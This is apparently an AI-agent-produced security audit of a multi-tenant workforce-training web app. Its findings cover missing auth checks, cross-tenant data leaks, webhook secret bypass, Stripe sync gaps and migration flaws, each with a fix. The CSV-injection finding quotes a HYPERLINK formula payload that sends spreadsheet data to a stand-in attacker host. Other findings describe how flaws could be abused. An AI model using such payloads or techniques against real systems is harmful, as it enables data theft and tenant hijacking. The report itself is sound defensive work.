# WorkforceAP — Deep Audit, 2026-05-16

Static audit + live unauthenticated probing of workforceap.org. 9 parallel
specialist agents fanned out across security, multi-tenancy, database,
API surface, frontend / a11y / i18n, performance & observability,
tests / CI / deploy, business logic / WIOA, and dependencies / privacy.

Total findings: **~275** (after de-duplication). Severity mix: **~24 CRITICAL,
~55 HIGH, ~120 MEDIUM, ~76 LOW/INFO**.

This document is the deliverable. Each finding includes `file_path:line` so
fixes can be located without re-running searches. Where two agents found the
same bug from different angles, the higher-impact framing is kept.

## 2. CRITICAL findings (24)

Per-finding format: title, file:line, evidence, why, fix.

### 2.1 Security & authentication

#### C-S1. Anonymous PUT on `/api/org/[slug]/settings` lets anyone hijack a tenant's `customDomain`
- **File:** `app/api/org/[slug]/settings/route.ts:22, 57`
- **Evidence:** Both `_GET` and `_PUT` handlers `prisma.organization.findUnique/update` by slug from URL. No `getUser()`, no admin check, no tenant check. PUT accepts `customDomain`, `name`, `logo`, `primaryColor`.
- **Why:** Anonymous attacker can read any tenant's settings AND set `customDomain` for any org. Because `lib/tenant/resolveOrgFromRequest.ts` maps host → org via `customDomain`, attacker can point a domain they control at the victim tenant. Also overwrite logo/brandColor.
- **Fix:** Add `getUser()` + `isAdminInOrg(user.id, org.id)` gate on both handlers. Forbid non-super-admins from setting `customDomain`.

#### C-S2. Webhook secret bypass on `/api/webhooks/learning-completion` when `WEBHOOK_SECRET` is empty
- **File:** `app/api/webhooks/learning-completion/route.ts:19-28`
- **Evidence:**
  ```ts
  const providedSecret = req.headers.get('x-webhook-secret') || '';
  const expectedSecret = process.env.WEBHOOK_SECRET || '';
  return timingSafeEqual(SHA256(actual), SHA256(expected)); // both '' => equal
  ```
- **Why:** With `WEBHOOK_SECRET` unset (it's blank in `.env.example:67`), `SHA256('') === SHA256('')` → anyone sending an empty `x-webhook-secret` header passes. The Coursera variant correctly guards with `if (!expectedSecret) return { ok: false }` (`lib/coursera/webhookAuth.ts:63`); this one does not.
- **Fix:** Add `if (!expectedSecret || !providedSecret) return false;` before the hash compare. Validate `WEBHOOK_SECRET` is set at boot.

#### C-S3. Public `/api/org/onboard` creates active tenants and claims arbitrary `customDomain` with no ownership proof
- **File:** `app/api/org/onboard/route.ts:43-130`
- **Evidence:** No auth, no domain TXT/CNAME verification, no Stripe completion gate. Inserts `Organization { active: true, customDomain }`.
- **Why:** Attacker can squat `customDomain` on any value, inject themselves into multi-tenant routing, pollute the orgs table, and abuse `customer_email` to start arbitrary Stripe checkouts. Rate-limit is 5/hr/IP and fails open if Redis is missing (see C-S7).
- **Fix:** Require authenticated user. Set `Organization.active = false` pending admin approval. Require DNS-verified TXT record before honoring `customDomain` in middleware. Defer the org row creation to the Stripe `checkout.session.completed` webhook (which doesn't exist today — see C-B1).

#### C-S4. CSV formula injection across all admin/partner exports
- **File:** `lib/csv.ts:6-9` (callers: `app/api/admin/members/bulk-export/route.ts:18`, `app/api/partner/export/referrals/route.ts:9`, `app/api/admin/programs/export-twc/route.ts:15`, and ~6 others)
- **Evidence:**
  ```ts
  export function csvEscape(value: string): string {
    if (/[",\n\r]/.test(value)) return `"${value.replace(/"/g, '""')}"`;
    return value;
  }
  ```
- **Why:** Member-supplied fields (`fullName`, `profileBio`, WIOA narrative answers) can start with `=`, `+`, `-`, `@`, `\t`, `\r`. Excel/Sheets will execute them as formulas when admin opens the export. Classic payload: `=HYPERLINK("http://evil/?c="&A1,"Click")`. WIOA/cohort exports are routinely opened by admins.
- **Fix:** In `csvEscape`, if value begins with `[=+\-@\t\r]`, prepend a single quote (or tab). Apply once, get every caller for free.

#### C-S5. xAPI raw-SQL tables have no `organization_id` — cross-tenant identity collisions
- **File:** `lib/xapi/mappings.ts:189-243`
- **Evidence:** `coursera_identity_mappings`, `coursera_xapi_events`, `coursera_unmatched_actor_alerts` created via `$executeRawUnsafe`. None have `organization_id`. `findUserByActor` does a global `$queryRaw` join.
- **Why:** Once Track-A multi-tenant goes live, a learner whose Coursera mapping was created under Org A will resolve cross-org via xAPI ingest. Coursera completions credit the wrong tenant. Raw `coursera_xapi_events` payloads (PII) also pool cross-tenant.
- **Fix:** Add `organization_id NOT NULL` to those tables; filter every `$queryRaw` by tenant; resolve org from the user before insert on ingest.

### 2.2 Multi-tenancy & data isolation

#### C-T1. `lib/counselor/staffMemberAccess.ts:11` uses global `isAdmin()` — admin from any org can read any other tenant's members
- **File:** `lib/counselor/staffMemberAccess.ts:7-21`
- **Evidence:** `if (await isAdmin(staffUserId)) return true;` — `isAdmin` only checks the profile/userRole, NOT actor↔subject org match.
- **Why:** Every route using this helper bypasses tenant isolation for admins:
  - `app/api/counselor/members/[memberId]/route.ts:35` — full profile incl. WIOA snapshot, employment barriers, applications, AI matches, messages, training
  - `app/api/counselor/members/[memberId]/resume/route.ts:33` — signs Supabase URLs to download any member's PDF
  - `app/api/counselor/members/[memberId]/notes/route.ts:38,66,102` — read/post/delete notes cross-tenant
  - `app/api/counselor/members/[memberId]/messages/route.ts`, `/award-points/route.ts`, `/activity-timeline/route.ts`, `/resume/preview/route.ts`, `/resume/docx-html/route.ts` — same
- **Fix:** Replace `isAdmin` with `isAdminInOrg(staffUserId, subject.organizationId)` (already exists in `lib/auth/roles.ts:57`). Look up the member's org first.

#### C-T2. `app/api/invite/accept/route.ts:578` — all accepted invites land in default org regardless of inviter
- **File:** `app/api/invite/accept/route.ts:578`
- **Evidence:** `organizationId = await getDefaultOrganizationId();` — hardcoded. The inviter's `organizationId` is not used.
- **Why:** Multi-tenant invites are broken at root. An Org B admin who invites a new user produces an account in the default org, with `partnerId`/`subgroupId` pointing into Org B → orphaned cross-tenant user.
- **Fix:** Resolve `organizationId` from `invitation.invitedById` (the inviter's `User.organizationId`).

#### C-T3. `app/api/admin/members/merge/route.ts:48-50` — no tenant gate on merge
- **File:** `app/api/admin/members/merge/route.ts:38-50`
- **Evidence:** `executeMemberMerge(tx, primaryId, secondaryId, user.id)` — no `getActorOrganizationId` or scoped lookup. `requireAdmin` is global.
- **Why:** An admin can merge an Org B member into an Org A member. Splats PII, enrollments, applications, points, messages, certifications across tenants. One-shot cross-tenant data exfil + corruption.
- **Fix:** Pre-merge, fetch both users with `findFirst({ where: { id, organizationId: actorOrgId } })` and reject if either is not in the admin's org.

#### C-T4. `app/api/admin/subgroups/[id]/members/route.ts:23, 29` — no tenant scope on subgroup or member list
- **File:** `app/api/admin/subgroups/[id]/members/route.ts:23, 29`
- **Evidence:** `prisma.subgroup.findUnique({ where: { id: subgroupId } })` and `prisma.memberSubgroup.findMany({ where: { subgroupId } })` — no org filter; `requireAdmin` global.
- **Why:** Any admin reads full member rosters, programs, placements, contact emails, certifications, applications of any subgroup. Massive PII leak.
- **Fix:** Resolve `subgroup.leader.organizationId` (or `partner.organizationId`) and reject when ≠ actor's org.

#### C-T5. `app/api/partner/referrals/route.ts:69` — POST creates referral for any `memberId` with no org match
- **File:** `app/api/partner/referrals/route.ts:69`
- **Evidence:** Accepts any UUID; `prisma.partnerReferral.create` succeeds.
- **Why:** Partner in Org A can claim a member in Org B as their referral. The corrupted row remains and can be assigned via PATCH; notifications/audit fire.
- **Fix:** Reject when `member.organizationId !== ctx.partner.organizationId`.

#### C-T6. `lib/auth/server.ts:99-108` `resolveAuthGucContext` always sets `orgId: null` — RLS GUC mechanism is non-functional
- **File:** `lib/auth/server.ts:99-108`
- **Evidence:** `return buildGucContext({ userId: user.id, orgId: null, profileRole });`
- **Why:** Every authenticated request gets `app.current_org_id` = empty. Every RLS policy in `prisma/migrations/20260513040000_add_rls_policies/migration.sql` that calls `can_access_org_row(check_org_id)` evaluates with `co IS NULL` → fails for admin reads. Today it's masked because Prisma uses the service-role connection that bypasses RLS. The moment `FORCE ROW LEVEL SECURITY` is enabled (its migration `20260514000000_defer_rls_force_authorize_system` already documents the deferral), the entire admin UI breaks.
- **Fix:** Inside `resolveAuthGucContext`, look up `getActorOrganizationId(user.id)` (cache) and pass into `buildGucContext`. Then audit whether GUCs even survive PgBouncer pool churn — see C-D1.

#### C-T7. `app/api/admin/employers/[id]/approve/route.ts:20` uses `getDefaultOrganizationId()` not `getActorOrganizationId(user.id)`
- **File:** `app/api/admin/employers/[id]/approve/route.ts:20`, `.../reject/route.ts:20`
- **Evidence:** `const orgId = await getDefaultOrganizationId();` followed by `withTenantScope(orgId, ...)`.
- **Why:** Hardcodes the default org into a write path; non-default-org admins can't approve their tenant's employers.
- **Fix:** Replace with `getActorOrganizationId(user.id)`.

#### C-T8. `app/api/admin/invites/route.ts:147, 154, 160` — POST does not validate that `subgroupId`/`partnerId` belong to the admin's org
- **File:** `app/api/admin/invites/route.ts:147-158`
- **Evidence:** `subgroup = prisma.subgroup.findUnique({ where: { id: subgroupId } })` — no org filter.
- **Why:** Admin in Org A can issue an invite whose `partnerId`/`subgroupId` belongs to Org B. New user lands in default org (per C-T2) with cross-tenant links.
- **Fix:** Filter both with `{ id, organization: { id: actorOrgId } }`.

### 2.3 Business logic / WIOA correctness

#### C-B1. Stripe subscription state never synced from webhooks — paid orgs stay `pending_payment` forever
- **File:** `app/api/stripe/webhook/route.ts:29-79`, `app/api/employer/checkout/route.ts:58-80`, `app/api/org/onboard/route.ts:108`
- **Evidence:** Checkout creates Stripe subscriptions and inserts `Organization` with `subscriptionStatus: 'pending_payment'`. The webhook handles only `account.updated`, `transfer.failed/paid`, `payout.failed`. No handler for `checkout.session.completed`, `customer.subscription.created/updated/deleted`, `invoice.paid/payment_failed`.
- **Why:** (a) Employers pay but never receive feature access; (b) employers cancel but keep access; (c) refunds/chargebacks unhandled; (d) no revenue reconciliation.
- **Fix:** Add handlers for the four subscription-lifecycle event types. Persist `Stripe.Event.id` in `webhook_events` to dedupe.

#### C-B2. Stripe platform webhook signs against `STRIPE_CONNECT_WEBHOOK_SECRET` (wrong secret)
- **File:** `app/api/stripe/webhook/route.ts:22`
- **Evidence:** Verifies via `getStripeConnectWebhookSecret()`. But the route also dispatches `payout.failed` and (when added) subscription events — these come from the platform on `STRIPE_WEBHOOK_SECRET`.
- **Why:** Non-Connect events silently 400 → never processed.
- **Fix:** Two routes (`/api/stripe/webhook/connect` and `/api/stripe/webhook/platform`), or accept both secrets and try each.

#### C-B3. WIOA assessment answer key is shipped to the browser
- **File:** `components/portal/AssessmentForm.tsx:6` + `lib/assessment/answer-key.ts`
- **Evidence:** `AssessmentForm` is a `'use client'` component importing `{ASSESSMENT_QUESTIONS, scoreAssessment}` from `lib/assessment/answer-key`. Every question's `correct: 'A'` field ends up in the JS bundle. `scoreAssessment` runs client-side before submission.
- **Why:** Test integrity is zero. Any user views source and looks up answers. Scores feed program-fit, milestones, and WIOA outcomes — federally funded program.
- **Fix:** Move scoring server-only. Send only `{id, question, choices: [{value, label}], points}` to the client. Accept `{questionId, choiceValue}[]` on a server route; compute score; never import `answer-key.ts` into a client component.

#### C-B4. Public WIOA qualification submissions are never persisted
- **File:** `app/api/public/wioa-qualification/route.ts:42-66`
- **Evidence:** After `computeWioaSignal()`, route emails answers to `info@workforceap.org` and returns the snapshot. No DB write.
- **Why:** If the email bounces or is filed wrong, the screening doesn't exist. WIOA partner agreements typically require demonstrating screening volume.
- **Fix:** Persist to a `PublicWioaScreening` table (email, fullName, snapshot, createdAt); email is a notification on top.

#### C-B5. Admin `app/api/admin/placements/route.ts:84-91` PATCH accepts arbitrary fields
- **File:** `app/api/admin/placements/route.ts:84-91`
- **Evidence:** `const { id, ...updates } = body; ... db.placementRecord.update({ where: { id }, data: updates })`. No zod, no allowlist.
- **Why:** Admin can spoof `userId`, backdate `placedAt`, falsify `salaryOffered`. Federal grant claims (PIRL) rely on `PlacementRecord` fidelity.
- **Fix:** Define a zod schema; whitelist fields; `auditLog` before/after on every PATCH.

#### C-B6. Placement survey can be resubmitted indefinitely, overwriting prior data
- **File:** `app/api/placement-survey/route.ts:37-89`
- **Evidence:** POST loads survey by id but doesn't check `completedAt`. The signed token (valid 60 days) can be POSTed N times; overwrites all fields.
- **Why:** WIOA PIRL data integrity. A member could keep updating "stillEmployed" after a follow-up call.
- **Fix:** Reject if `completedAt != null`. Shrink token TTL (M-B1).

### 2.4 Database

#### C-D1. RLS GUC mechanism cannot survive PgBouncer pool churn — RLS is theatre
- **File:** `lib/db/prisma.ts:62-107`
- **Evidence:** Comment at `:59` admits "For single (non-transactional) queries the `$executeRawUnsafe` call and the subsequent `next(params)` may land on different connections from the pool. This is a best-effort safeguard." `.env.example:30` references `pgbouncer=true`. On PgBouncer transaction-mode pooling, `set_config(...,true)` only persists for the current transaction; Prisma's auto-commit single statements get a fresh implicit transaction. Combined with migration `20260514000000_defer_rls_force_authorize_system` which intentionally does **not** `FORCE ROW LEVEL SECURITY`, production today only works because the postgres role bypasses RLS.
- **Why:** Defense-in-depth claimed in the codebase doesn't exist. The moment FORCE is enabled, admin paths break (per C-T6). Today the GUC is wishful.
- **Fix:** Wrap every authenticated route's DB work in `$transaction(async tx => ...)` so GUC and queries share a single connection. Or pin to session-mode pooling. Or move to JWT claims (`auth.uid()` Supabase-native) for RLS.

#### C-D2. `agent_tasks` table used by `lib/swarm/taskQueue.ts` but never defined in schema or any migration
- **File:** `lib/swarm/taskQueue.ts:32-126`
- **Evidence:** `prisma.$queryRawUnsafe('INSERT INTO agent_tasks ...')` etc. `grep agent_tasks prisma/` returns nothing.
- **Why:** Any call to `enqueueTask` / `claimNextTask` throws "relation does not exist".
- **Fix:** Add a Prisma model + migration, or delete `lib/swarm/taskQueue.ts` if the swarm is dead code.

#### C-D3. `scripts/safe-migrate.cjs:42-71` papers over real migration failures
- **File:** `scripts/safe-migrate.cjs:42-71`
- **Evidence:** On P3018/P3009/duplicate-type/duplicate-relation, regexes the migration name and `prisma migrate resolve --applied <name>` — marks the failed migration "applied" without running it. Retries up to 5×.
- **Why:** Swallows partial migrations (a migration that created 3 of 4 tables, failed on the 4th, is marked done with 1 table missing). Explains the multiple post-incident "fix_schema_drift" migrations in the tree.
- **Fix:** Stop auto-resolving on failure. Surface the error. Require human review. Auto-resolve only behind an explicit `--force` flag.

#### C-D4. Ten pairs of duplicate-timestamp migrations
- **File:** `prisma/migrations/` — e.g. `20260514000000_defer_rls_force_authorize_system` + `20260514000000_add_webhook_events`
- **Evidence:** Identical prefixes; Prisma orders alphabetically by suffix on a fresh deploy. Team mental model assumes timestamp ordering.
- **Why:** Combined with C-D3, a fresh deploy that hits one in the "wrong" order silently skips real DDL.
- **Fix:** Re-timestamp conflicts (bump by 1 second each). Add `migration_lock.toml` (missing today — see H-D1). Pre-commit hook rejecting duplicates.

### Security & auth
- CSP carries `'unsafe-inline'` + `'unsafe-eval'` on `script-src`. (`next.config.ts:79`) Migrate to nonces; drop `unsafe-eval` immediately.
